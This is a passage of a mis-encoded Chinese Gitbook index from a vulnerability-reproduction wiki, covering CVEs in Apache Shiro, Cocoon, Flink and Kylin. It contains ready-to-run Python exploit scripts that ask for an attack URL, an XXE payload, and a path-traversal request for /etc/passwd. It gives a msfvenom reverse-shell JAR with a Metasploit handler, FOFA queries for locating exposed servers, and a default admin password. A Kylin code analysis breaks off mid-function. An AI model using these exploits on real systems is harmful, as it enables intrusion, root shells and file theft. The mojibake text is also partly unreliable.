å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437.html","title":"Apache Shiro =1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437","keywords":"","body":"Apache Shiro æ¼æ´æè¿° Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚ Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Shiro æ¼æ´ç¯å¢ƒ https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d è®¿é—®http://xxx.xxx.xxx.xxx:8080/loginæ­£å¸¸å³å¯ æ¼æ´å¤ç° Shiroå·²ç»æœ‰æ¯”è¾ƒå®Œå–„çš„å·¥å…· https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 è¿™é‡Œä½¿ç”¨çš„æ˜¯ ShiroExploit å·¥å…·è¿›è¡Œå¤ç° æ‰“å¼€åè¾“å…¥urlå³å¯ æˆåŠŸåå¼¹shell å‚è€ƒæ–‡ç«  Shiro RememberMe 1.2.4è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-è¯¦ç»†åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/","title":"Apache Coocon","keywords":"","body":"Apache Cocoon Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-08 12:42:56 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Cocoon/Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991.html","title":"Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991","keywords":"","body":"Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 æ¼æ´æè¿° 9æœˆ11æ—¥ Apache è½¯ä»¶åŸºé‡‘ä¼šå‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œä¿®å¤äº† Apache Cocoon xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2020-11991ï¼‰ã€‚ Apache Cocoon æ˜¯ä¸€ä¸ªåŸºäº Spring æ¡†æ¶çš„å›´ç»•åˆ†ç¦»ç†å¿µå»ºç«‹çš„æ„æ¶ï¼Œåœ¨è¿™ç§æ¡†æ¶ä¸‹çš„æ‰€æœ‰å¤„ç†éƒ½è¢«é¢„å…ˆå®šä¹‰å¥½çš„å¤„ç†ç»„ä»¶çº¿æ€§è¿æ¥èµ·æ¥ï¼Œèƒ½å¤Ÿå°†è¾“å…¥å’Œäº§ç”Ÿçš„è¾“å‡ºæŒ‰ç…§æµæ°´çº¿é¡ºåºå¤„ç†ã€‚ç”¨æˆ·ç¾¤ï¼šApache Lenyaã€Daisy CMSã€Hippo CMSã€Mindquarryç­‰ç­‰ï¼ŒApache Cocoon é€šå¸¸è¢«ä½œä¸ºä¸€ä¸ªæ•°æ®æŠ½å–ã€è½¬æ¢ã€åŠ è½½å·¥å…·æˆ–è€…æ˜¯ç³»ç»Ÿä¹‹é—´ä¼ è¾“æ•°æ®çš„ä¸­è½¬ç«™ã€‚CVE-2020-11991 ä¸ StreamGenerator æœ‰å…³ï¼Œåœ¨ä½¿ç”¨ StreamGenerator æ—¶ï¼Œä»£ç å°†è§£æç”¨æˆ·æä¾›çš„ xmlã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨åŒ…æ‹¬å¤–éƒ¨ç³»ç»Ÿå®ä½“åœ¨å†…çš„ç‰¹åˆ¶ xml æ¥è®¿é—®æœåŠ¡å™¨ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" æ¼æ´å¤ç° å‘/v2/api/product/manger/getInfo POSTå¦‚ä¸‹å†…å®¹ ]> John &ent; æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-type\": \"text/xml\" } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] å«æœ‰CVE-2020-11991æ¼æ´ï¼Œå“åº”ä¸º{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-15 09:55:50 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-06 19:14:04 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518.html","title":"Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518","keywords":"","body":"Apache Flink æ¼æ´æè¿° è¿‘æ—¥,æœ‰å®‰å…¨ç ”ç©¶å‘˜å…¬å¼€äº†ä¸€ä¸ªApache Flinkçš„ä»»æ„JaråŒ…ä¸Šä¼ å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´. æ¼æ´å½±å“ [!NOTE] Apache Flink FOFA FOFA è¯­å¥ app=\"Apache-Flink\" && country=\"CN\" å›½å†…è¿˜æ˜¯å¾ˆå¤šä½¿ç”¨ Apache Flink çš„ï¼Œå¤§æ¦‚æœ‰1000çš„æ•°é‡å·¦å³ æ¼æ´å¤ç° æ‰“å¼€ä¸€ä¸ªä½¿ç”¨ Apache Flink çš„ç½‘ç«™ï¼Œæ‰“å¼€åé¡µé¢ä¸ºè¿™æ ·å­ ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ é¡µé¢ æ‰“å¼€MSF ç”Ÿæˆä¸€ä¸ª jar æœ¨é©¬ msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar ç‚¹å‡» Add ä¸Šä¼  jar æ–‡ä»¶ ç›‘å¬ç«¯å£ msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run ç‚¹å‡»ä¸‹ submit åå¼¹å›æ¥ä¸€ä¸ªroot æƒé™shell æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] å¯èƒ½å­˜åœ¨ Apache Flink >> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Flink/Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519.html","title":"Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519","keywords":"","body":"Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 æ¼æ´æè¿° 2021å¹´01æœˆ06æ—¥ï¼Œ360CERTç›‘æµ‹å‘ç°Apache Flinkå‘å¸ƒäº†Apache Flink ç›®å½•ç©¿è¶Šæ¼æ´,ç›®å½•ç©¿è¶Šæ¼æ´çš„é£é™©é€šå‘Šï¼Œæ¼æ´ç¼–å·ä¸ºCVE-2020-17518,CVE-2020-17519ï¼Œæ¼æ´ç­‰çº§ï¼šé«˜å±ï¼Œæ¼æ´è¯„åˆ†ï¼š8.5ã€‚ è¿œç¨‹æ”»å‡»è€…é€šè¿‡REST APIç›®å½•éå†ï¼Œå¯é€ æˆæ–‡ä»¶è¯»å–/å†™å…¥çš„å½±å“ã€‚ æ¼æ´å½±å“ [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA [!NOTE] app=\"Apache Flink\" ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 æ¼æ´å¤ç° POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd æ¼æ´åˆ©ç”¨POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] è¯·æ±‚URL ï¼š {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´,æˆåŠŸè¯»å– /etc/passwd ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] è¯·æ±‚URL ï¼š {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´,æˆåŠŸè¯»å– {} ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] ç›®æ ‡æ–‡ä»¶{}è¯»å–å¤±è´¥\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile >>> \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤ Apache kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-24 13:31:33 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤.html","title":"Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤","keywords":"","body":"Apache Kylin Console æ§åˆ¶å°å¼±å£ä»¤ æ¼æ´æè¿° Apache Kylin Console æ§åˆ¶å°å­˜åœ¨é»˜è®¤å¼±å£ä»¤ adminï¼šKYLINï¼Œå¯è¢«ç™»å½•æ§åˆ¶å°è¿›ä¸€æ­¥åˆ©ç”¨å…¶ä»–æ¼æ´ æ¼æ´å½±å“ [!NOTE] Apache Kylin æ¼æ´å¤ç° æ‰“å¼€åç›®æ ‡ç«™ç‚¹ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Apache_Kylin_Console_Default_password.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937.html","title":"Apache Kylin æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937","keywords":"","body":"Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² CVE-2020-13937 æ¼æ´æè¿° Apache Kylinæœ‰ä¸€ä¸ªrestful apiä¼šåœ¨æ²¡æœ‰ä»»ä½•è®¤è¯çš„æƒ…å†µä¸‹æš´éœ²é…ç½®ä¿¡æ¯ã€‚ FOFA [!NOTE] app=\"APACHE-kylin\" æ¼æ´å½±å“ [!NOTE] Apahche Kylin 2.x.x Apahche Kylin Apahche Kylin 4.0.0-alpha æ¼æ´å¤ç° æ ¹æ®æ¼æ´æƒ…æŠ¥ æ¼æ´åˆ©ç”¨POCä¸º http://xxx.xxx.xxx.xxx/kylin/api/admin/config æ¼æ´æ£€æµ‹POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] å­˜åœ¨Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²\\n[o] å“åº”ä¸º:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby && POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Apache_Kylin_Unauthorized_configuration_disclosure.json å‚è€ƒ CVE-2020-13937|Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ²æ¼æ´ï¼Œè…¾è®¯å®‰å…¨å…¨é¢æ”¯æŒæ£€æµ‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956.html","title":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956","keywords":"","body":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 æ¼æ´æè¿° 2020å¹´5æœˆ22æ—¥ï¼ŒCNVD é€šæŠ¥äº† Apache Kylin å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956ï¼Œåœ°å€åœ¨ http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 ã€‚ Apache Kylin æ˜¯ç¾å›½ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼åˆ†æå‹æ•°æ®ä»“åº“ã€‚è¯¥äº§å“ä¸»è¦æä¾› Hadoop/Spark ä¹‹ä¸Šçš„ SQL æŸ¥è¯¢æ¥å£åŠå¤šç»´åˆ†æï¼ˆOLAP**ï¼‰ç­‰åŠŸèƒ½ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ Kylinå®˜æ–¹æ–‡æ¡£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•° docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ æ¼æ´åˆ†æ æŸ¥çœ‹è¿™ä¸ªæ¼æ´ä¿®å¤çš„è¡¥ä¸ æŸ¥çœ‹åœ°å€ è¿™é‡Œå¯ä»¥çœ‹åˆ°æ­¤æ¼æ´æœ‰å…³çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ srcCfgUriã€dstCfgUriã€projectNameï¼Œç›¸å…³çš„å‡½æ•°ä¸º migrateCube å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ migrateCube çš„æè¿° POST /kylin/api/cubes/{cube}/{project}/migrate ä¸‹è½½ Apache Kylin 3.0.1 çš„æºä»£ç è¿›è¡Œä»£ç å®¡è®¡,å‡ºç°æ¼æ´å‡½æ•°çš„æ–‡ä»¶ä¸ºä»¥ä¸‹è·¯å¾„ apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java æ‰¾åˆ°migrateCubeå‡½æ•° @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorizeé‡Œé¢å®šä¹‰äº†è·¯ç”±æƒé™ï¼ŒADMINæƒé™ã€ADMINISTRATIONæƒé™å’ŒMANAGEMENTæƒé™å¯ä»¥è®¿é—®è¯¥serviceã€‚ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") åœ¨1087è¡Œåˆ¤æ–­æ˜¯å¦å¼€å¯äº†MigrateCubeè®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯åˆ™ä¼šæŠ¥é”™ è·Ÿè¿› isAllowAutoMigrateCube() è¿™ä¸ªå‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤çš„é…ç½®kylin.tool.auto-migrate-cube.enabled å°±æ˜¯Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } åœ¨æ²¡æœ‰å¼€å¯é…ç½®kylin.tool.auto-migrate-cube.enabledä¸ºtrueçš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨MigrateCubeåˆ™ä¼šå‡ºç°æŠ¥é”™ é€šè¿‡Apache Kylinçš„SYSTEMæ¨¡å—å¼€å¯kylin.tool.auto-migrate-cube.enabledä¸ºTrue è®¾ç½®åå†å»è¯·æ±‚åˆ™ä¸ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ï¼Œè€Œæ˜¯å‡ºç°Source configuration should not be empty è·Ÿè¿›å‡ºç°æŠ¥é”™è¯­å¥çš„ä»£ç å— String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); è¿™é‡Œè¿›è¡Œäº†å¯¹kylin.tool.auto-migrate-cube.src-configå’Œkylin.tool.auto-migrate-cube.dest-configçš„é…ç½®è¿›è¡Œäº†æ£€æµ‹ ,å¦‚æœä¸ºç©ºåˆ™ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ è·Ÿè¿› getAutoMigrateCubeSrcConfig()å’ŒgetAutoMigrateCubeDestConfig()å‡½æ•° public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } å‘ç°è¿™ä¸¤ä¸ªé…ç½®é»˜è®¤ä¸ºç©ºï¼Œå› ä¸ºé…ç½®å…è®¸è‡ªå®šä¹‰ï¼Œæ‰€ä»¥srcCfgUriå’ŒdstCfgUriä¸¤ä¸ªå˜é‡å‡æ˜¯å¯æ§çš„ ç»§ç»­å‘ä¸‹èµ°ï¼Œå‘ç°ä¸€å¤„å‘½ä»¤æ‹¼æ¥ String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } è¿›å…¥åˆ°executeå‡½æ•° private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = 